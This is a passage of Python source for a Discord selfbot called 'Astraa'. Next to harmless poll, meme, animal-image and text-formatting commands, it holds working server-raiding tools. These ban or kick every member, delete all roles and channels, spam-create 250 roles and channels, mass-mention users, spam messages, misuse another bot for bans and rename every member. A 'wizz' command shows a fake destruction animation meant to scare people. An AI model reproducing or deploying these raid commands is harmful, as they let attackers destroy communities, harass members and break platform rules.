    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qb = soup.find(id='qb').text
    message = await ctx.send(f"{qa}\nor\n{qb}")
    await message.add_reaction("🅰")
    await message.add_reaction("🅱")

#Make a poll
@Astraa.command()
async def poll(ctx, *, arguments=None):
    await ctx.message.delete()
    if arguments is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}poll msg:<message> 1:<option1> 2:<option2>')
        return
    message = discord.utils.escape_markdown(arguments[str.find(arguments, "msg:"):str.find(arguments, "1:")]).replace("msg:", "")
    option1 = discord.utils.escape_markdown(arguments[str.find(arguments, "1:"):str.find(arguments, "2:")]).replace("1:", "")
    option2 = discord.utils.escape_markdown(arguments[str.find(arguments, "2:"):]).replace("2:", "")
    message = await ctx.send(f'`Poll: {message}\nOption 1: {option1}\nOption 2: {option2}`')
    await message.add_reaction('🅰')
    await message.add_reaction('🅱')

#Generate a random question
@Astraa.command()
async def topic(ctx):
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send(topic)

#Shows the size of your dick
@Astraa.command(aliases=['penis'])
async def dick(ctx, *, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    await ctx.send(f"**{user}**'s Dick size\n8{dong}D")

#Reverse your own message
@Astraa.command()
async def reverse(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}reverse <message>')
        return
    message = message[::-1]
    await ctx.send(message)


#Server commands
#Duplicate a Discord server
@Astraa.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):
    await ctx.message.delete()
    await Astraa.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Astraa.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except Exception as e:
        await ctx.send(f'[ERROR]: {e}')

#Mass mention users
@Astraa.command()
async def massmention(ctx, *, message=None):
    await ctx.message.delete()
    if len(list(ctx.guild.members)) >= 50:
        userList = list(ctx.guild.members)
        random.shuffle(userList)
        sampling = random.choices(userList, k=50)
        if message is None:
            post_message = ""
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
    else:
        if message is None:
            post_message = ""
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)

#Mass ban users
@Astraa.command(aliases=["banwave", "banall", "etb"])
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="sry <3")
        except Exception as e:
            await ctx.send(f'[ERROR]: {e}')

#Mass unban users
@Astraa.command(aliases=["purgebans", "unbanall"])
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except Exception as e:
            await ctx.send(f'[ERROR]: {e}')

#Ban a user with dyno
@Astraa.command()
async def dynoban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("?ban " + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)

#Mass kick users
@Astraa.command(aliases=["kickall", "kickwave"])
async def masskick(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="sry <3")
        except Exception as e:
            await ctx.send(f'[ERROR]: {e}')

#Mass create roles
@Astraa.command(aliases=["spamroles"])
async def massrole(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
            await ctx.guild.create_role(name="sry <3", color=randcolor)
        except Exception as e:
            await ctx.send(f'[ERROR]: {e}')

#Mass delete roles
@Astraa.command(aliases=["deleteroles"])
async def delroles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except Exception as e:
            await ctx.send(f'[ERROR]: {e}')

#Mass create channels
@Astraa.command(aliases=["masschannels", "masschannel", "ctc"])
async def spamchannels(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="sry <3")
        except Exception as e:
            await ctx.send(f'[ERROR]: {e}')

#Mass delete channels
@Astraa.command(aliases=["delchannel"])
async def delchannels(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except Exception as e:
            await ctx.send(f'[ERROR]: {e}')

#Send a message in all channels
@Astraa.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)

#DM all users in a server
@Astraa.command()
async def dm(ctx, user: discord.Member, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}dm <user> <message>')
        return
    user = Astraa.get_user(user.id)
    if ctx.author.id == Astraa.user.id:
        return
    else:
        try:
            await user.send(message)
        except Exception as e:
            await ctx.send(f'[ERROR]: {e}')

#Fake Wizz a Discord server
@Astraa.command()
async def wizz(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.TextChannel):
        print("hi")
        initial = random.randrange(0, 60)
        message = await ctx.send(f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`")
    elif isinstance(ctx.message.channel, discord.DMChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
    elif isinstance(ctx.message.channel, discord.GroupChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`")

#Scrape Guild icon
@Astraa.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
async def guildicon(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"**{ctx.guild.name}** has no icon")
        return
    await ctx.send(ctx.guild.icon_url)

#Scrape Guild banner
@Astraa.command(aliases=['serverbanner'])
async def banner(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"**{ctx.guild.name}** has no banner")
        return
    await ctx.send(ctx.guild.banner_url)

#Rename channels
Astraa.command(aliases=["rc"])
async def renamechannels(ctx, *, name=None):
    await ctx.message.delete()
    if name is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}renamechannels <name>')
        return
    for channel in ctx.guild.channels:
        await channel.edit(name=name)

#Rename server
@Astraa.command(aliases=["renameserver", "nameserver"])
async def servername(ctx, *, name=None):
    await ctx.message.delete()
    if name is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}servername <name>')
        return
    await ctx.guild.edit(name=name)

#Rename everyone
@Astraa.command()
async def nickall(ctx, nickname=None):
    await ctx.message.delete()
    if nickname is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}nickall <nickname>')
        return
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass

#React to the last 20 messages
@Astraa.command()
async def massreact(ctx, emote=None):
    await ctx.message.delete()
    if emote is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}massreact <emote>')
        return
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)

#Purge messages in a channel
@Astraa.command()
async def purge(ctx, amount: int=None):
    await ctx.message.delete()
    if amount is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}purge <amount>')
        return
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Astraa.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
            pass


#Friend commands
#Accept all your friends requests
@Astraa.command()
async def acceptfriends(ctx):
    await ctx.message.delete()
    for relationship in Astraa.user.relationships:
        if relationship == discord.RelationshipType.incoming_request:
            await relationship.accept()

#Ignore all your friends requests
@Astraa.command()
async def ignorefriends(ctx):
    await ctx.message.delete()
    for relationship in Astraa.user.relationships:
        if relationship is discord.RelationshipType.incoming_request:
            relationship.delete()

#Decline all your friends requests
@Astraa.command()
async def delfriends(ctx):
    await ctx.message.delete()
    for relationship in Astraa.user.relationships:
        if relationship is discord.RelationshipType.friend:
            await relationship.delete()

#Clear all blocked users
@Astraa.command()
async def clearblocked(ctx):
    await ctx.message.delete()
    print(Astraa.user.relationships)
    for relationship in Astraa.user.relationships:
        if relationship is discord.RelationshipType.blocked:
            print(relationship)
            await relationship.delete()


#Group commands
#Kick all users from group
@Astraa.command()
async def kickgc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        for recipient in ctx.message.channel.recipients:
            await ctx.message.channel.remove_recipients(recipient)

#Leave a group
@Astraa.command(name='group-leaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups', "groupleave", "groupleaver"])
async def group_leaver(ctx):
    await ctx.message.delete()
    for channel in Astraa.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

#Delete you message in a group
@Astraa.command(aliases=["gcleave"])
async def leavegc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.message.channel.leave()


#Meme commands
#Display a dog
@Astraa.command()
async def dog(ctx):
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    link = str(r['message'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_dog.png"))
    except:
        await ctx.send(link)

#Display a cat
@Astraa.command()
async def cat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.thecatapi.com/v1/images/search").json()
    link = str(r[0]["url"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_cat.png"))
    except:
        await ctx.send(link)

#Display a Sad Cat
@Astraa.command()
async def sadcat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/sadcat").json()
    link = str(r['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_sadcat.png"))
    except:
        await ctx.send(link)

#Display a bird
@Astraa.command()
async def bird(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/birb").json()
    link = str(r['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_bird.png"))
    except:
        await ctx.send(link)

#Display a fox
@Astraa.command()
async def fox(ctx):
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    link = str(r["image"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_fox.png"))
    except:
        await ctx.send(link)

#Display a feed with a user
@Astraa.command()
async def feed(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"astraa_feed.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

#Display a tickle with a user
@Astraa.command()
async def tickle(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"astraa_tickle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

#Display a slap with a user
@Astraa.command()
async def slap(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"astraa_slap.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

#Display a hug with a user
@Astraa.command()
async def hug(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"astraa_hug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

#Display a cuddle with a user
@Astraa.command()
async def cuddle(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/cuddle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"astraa_cuddle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

#Display a smug with a user
@Astraa.command()
async def smug(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"astraa_smug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

#Display a pat with a user
@Astraa.command()
async def pat(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"astraa_pat.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

#Display a kiss with a user
@Astraa.command()
async def kiss(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"astraa_kiss.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


#Message commands
#Send a shrug
@Astraa.command()
async def shrug(ctx):
    await ctx.message.delete()
    shrug = r'¯\_(ツ)_/¯'
    await ctx.send(shrug)

#Send a lenny
@Astraa.command()
async def lenny(ctx):
    await ctx.message.delete()
    lenny = '( ͡° ͜ʖ ͡°)'
    await ctx.send(lenny)

#Send a tableflip
@Astraa.command(aliases=["fliptable"])
async def tableflip(ctx):
    await ctx.message.delete()
    tableflip = '(╯°□°）╯︵ ┻━┻'
    await ctx.send(tableflip)

#Send a unflip
@Astraa.command()
async def unflip(ctx):
    await ctx.message.delete()
    unflip = '┬─┬ ノ( ゜-゜ノ)'
    await ctx.send(unflip)

#Send a bold message
@Astraa.command()
async def bold(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}bold <message>')
    await ctx.send('**' + message + '**')

#Send a censor message
@Astraa.command()
async def censor(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}censor <message>')
    await ctx.send('||' + message + '||')

#Send a underline message
@Astraa.command()
async def underline(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}underline <message>')
    await ctx.send('__' + message + '__')

#Send a italicize message
@Astraa.command()
async def italicize(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}italicize <message>')
        return
    await ctx.send('*' + message + '*')

#Send a strike message
@Astraa.command()
async def strike(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}strike <message>')
        return
    await ctx.send('~~' + message + '~~')

#Send a quote message
@Astraa.command()
async def quote(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}quote <message>')
        return
    await ctx.send('> ' + message)

#Send a code message
@Astraa.command()
async def code(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}code <message>')
        return
    await ctx.send('`' + message + "`")

#Send a empty message
@Astraa.command()
async def empty(ctx):
    await ctx.message.delete()
    await ctx.send(chr(173))








#Start everything
if __name__ == '__main__':
    import sys
    try:
        assert sys.version_info >= (3,9)
    except AssertionError:
        input(f"{y}[{Fore.RED}#{y}]{w} Sorry but, your python version ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}) is not compatible with @TIO, please download python 3.9 or higher.")
        sys.exit()
    os.system("cls")
    Init()
